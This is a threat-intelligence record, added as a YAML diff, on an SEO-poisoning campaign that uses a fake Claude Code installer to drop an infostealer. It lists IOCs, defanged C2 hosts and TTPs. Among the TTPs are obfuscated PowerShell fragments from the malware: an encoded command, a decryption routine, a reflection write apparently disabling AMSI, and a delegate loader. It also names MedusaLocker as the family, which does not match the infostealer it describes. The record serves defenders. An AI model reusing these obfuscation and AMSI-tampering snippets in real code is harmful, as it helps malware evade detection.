@@ -1,0 +1,89 @@
+title: 'Bad Ads, Worse Binaries: Fake Claude Code Installer Drops Infostealer'
+description: An SEO poisoning campaign targeting users searching for Claude Code installation
+  guides uses a ClickFix lure to execute a malicious MSHTA command, delivering a six-stage
+  fileless infostealer chain that terminates in a reflective .NET credential stealer
+  beaconing to Russian infrastructure.
+attribution: ''
+malware_families:
+- MedusaLocker
+cves: []
+ttps:
+  processes:
+  - mshta.exe
+  - cmd.exe
+  - powershell.exe
+  command_lines:
+  - '%windir%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe'
+  - powershell -E JABUAGKACABWAGHAZOASACEARWBIANOALQBGAGKABABIAEGAYBZAGEATANAEKALE
+    BWAHUAJABTAHOACEBIAGEADQAGAFSASQBPACAATOB1AGBABHBYAHKAUWEAAHTAZOBWAGOAXQAGADGADDA
+    HCAKABAQAZGE4AHOALiPAGAAYBVACOAIQBUAGcAXQASADOAVOBUAEYADAAAEcAZQOAETAGQROAGUACHAOACOA
+  powershell:
+  - JABUAGKACABWAGHAZOASACEARWBIANOALQBGAGKABABIAEGAYBZAGEATANAEKALEБWAHUAJABTAHOACEBIAGEADQAGAFSASQBPACAATOB1AGBABHBYAHKAUWEAAHTAZOBWAGOAXQAGADGADDHCAKABАРQAZGE4AHOALIPAGAAYBVACОAIQBUAGCAXQASADOAVOBУAEFADAAEGAZEQAQETAGEQRОAGEUACHAОACОAQPRADEFDAEATQAFURVAEATATЕSOACORQAACORLQRUAYADVAFHAHOBSAEAAQOIAEUAKQADACKALAAUAEERDABOAGEACDAKQRSADLACAATOSEADUAKOAUAEAVGEALTAHURY0AROACEDPAGАРXHOADAALARАADYAYQAUQAHAGEAELAHIAKAROADBTACDGQAAEALGEOACAAADLАADGEPAGHALQDOAGEASQDRRАTOAGANYQNAGURCBARDORDLTAGUACO2AURGODAGURGLDALGARУQBOAGURV
+    GGGKIGEANAGEADLIONGOAAGTAYOBIAGAAPQDQANNIUNZQDSADSAZGULАMBEAGKABDUACAVАLAGAAУOBIQASQDACAGGVTATODУAGEABQAGACGAIALSÁGBAYMOAGHALAAGACQACDBAGECDONF
+    ADANAGBABEADDSLAYAUAATLAILABEAGAF
+  - function TenantId { param ($local, $startPosition); return [Byte]((bool($local
+    -band $startPosition)) -band (-bnot((-bnot $local) -band (-bnot $startPosition))))
+    }
+  - $msbuildEngine = 25; function GlobalJson { param ($vsMinVersion, $sessions); $restore
+    = New-Object Byte[] $msbuildEngine; $noPath = New-Object Byte[] $msbuildEngine;
+    for ($packagePath = 0; $packagePath -lt $msbuildEngine; $packagePath++) { $restore[$packagePath]
+    = $packagePath; $noPath[$packagePath] = $sessions[$packagePath % $sessions.length];
+    }; $outputConfigurationData = 0; for ($packagePath = 0; $packagePath -lt $msbuildEngine;
+    $packagePath++) { $outputConfigurationData = ($outputConfigurationData + $restore[$packagePath]
+    + $noPath[$packagePath]) % $msbuildEngine; $shaFile = $restore[$packagePath];
+    $restore[$packagePath] = $restore[$outputConfigurationData]; $restore[$outputConfigurationData]
+    = $shaFile; }; $packagePath = $outputConfigurationData = 0; for ($ResourcesPath
+    = 0; $ResourcesPath -lt $vsMinVersion.Length; $ResourcesPath++) { $packagePath
+    = ($packagePath + 1) % $msbuildEngine; $outputConfigurationData = ($outputConfigurationData
+    + $restore[$packagePath]) % $msbuildEngine; $shaFile = $restore[$packagePath];
+    $restore[$packagePath] = $restore[$outputConfigurationData]; $restore[$outputConfigurationData]
+    = $shaFile; [int]$basePath = ($vsMinVersion[$ResourcesPath] + $restore[($packagePath
+    + $outputConfigurationData) % $msbuildEngine]); $vsMinVersion[$ResourcesPath]
+    = TenantId $vsMinVersion[$ResourcesPath] $restore[$basePath] } $vsMinVersion }
+  - try { [Runtime.InteropServices.Marshal]::WriteInt32(([Ref].(credEntry 'jnetLengvg.').GetType((credEntry
+    'RIEOCnt500Nb2r305ORoELPcDpr03275k5')).GetField((credEntry 'ralNLee2gPUFLIE'),
+    [Reflection.BindingFlags](credEntry 'HRGPGT517VDoDTughe=1')).GetValue($null)),
+    [int](credEntry '*/suLebboarD0dg==')) } catch {}
+  - $iqzjtpakgage855=(-join[char[]]@(0x6c,101,0x6e,103,116,0x68))
+  - $fuougtyagwlloztyva=[type](-join[char[]]@(98,121,0x74,0x65,91,93))
+  - $iv6jbybtiw2rlmmr=[type](-join[char[]]@(0x74,104,114,0x65,0x61,100,0x69,0x6e,103,0x2e,116,0x68,114,0x65,0x61,100))
+  - $qusuwuxdnhbgkjcpm=(-join[char[]]@(0x73,108,101,101,112))
+  - $KX65L936kgMx=0;(989,145,425)|foreach($kPZ1B6BGBPOrSOCORNUSZGuK in $KX65L936kgMx){$3Qe6HWhfcuG5=($kPZ1B6BGBPOrSOCORNUSZGuK+44-44)}
+  - function geelipkszfuzzs { Param([Parameter(Position=0,Mandatory=$true)][type]$icacdsqbdhibs,
+    [Parameter(Position=1)][type]$lyxapsfudef); $_mcd=[type]('Sys'+'tem.Mul'+'ticas'+'tDel'+'ega'+'te');
+    $_an=[type]('Sys'+'tem.Ref'+'lect'+'ion.Ass'+'emb'+'ly'+'Na'+'me'); $_aba=[type]('Sys'+'tem.Ref'+'lect'+'ion.E'+'mit.Ass'+'embl'+'yBui'+'lde'+'rAcc'+'ess')
+    }
+  - function ktjvqexrecveht { Param($nnfgutxghknrfhsw,$itzkwiisc496); return $_m::('Get'+'Dele'+'gate'+'For'+'Func'+'tion'+'Poi'+'nte'+'r')($nnfgutxghknrfhsw,
+    $itzkwiisc496) }
+  scripts: []
+  registry_keys: []
+  image_loads: []
+  network_connections:
+  - mshta.exe -> download.version-516[.]com:443
+  - powershell.exe -> 185[.]177[.]239[.]255:443
+  file_activity: []
+  persistence:
+  - Scheduled task registered via Schedule.Service COM object spawning cmd.exe with
+    delayed-expansion enabled, reconstructing "powershell" at runtime using split
+    variables
+  process_relations:
+  - mshta.exe -> cmd.exe
+  - cmd.exe -> powershell.exe
+iocs:
+  hashes: []
+  ip_addresses:
+  - 185[.]177[.]239[.]255
+  domains:
+  - download.version-516[.]com
+  - oakenfjrod[.]ru
+  urls:
+  - hxxps://www.cyderes[.]com/hs-fs/hubfs/-Images/-Webpage%20Images/Howler%20Cell/Claude%20Code/image005.png
+  - hxxps://www.cyderes[.]com/hs-fs/hubfs/-Images/-Webpage%20Images/Howler%20Cell/Claude%20Code/image007.png
+  - hxxps://www.cyderes[.]com/hs-fs/hubfs/-Images/-Webpage%20Images/Howler%20Cell/Claude%20Code/image009.png
+  - hxxps://www.cyderes[.]com/hs-fs/hubfs/-Images/-Webpage%20Images/Howler%20Cell/Claude%20Code/image011.png
+  - hxxps://www.cyderes[.]com/hs-fs/hubfs/-Images/-Webpage%20Images/Howler%20Cell/Claude%20Code/image013.png
+authors:
+- Howler Cell
+reference: https://www.cyderes.com/howler-cell/fake-claude-code-installer-infostealer
+date_of_publication: June 01, 2026
+file_creation_date: June 01, 2026
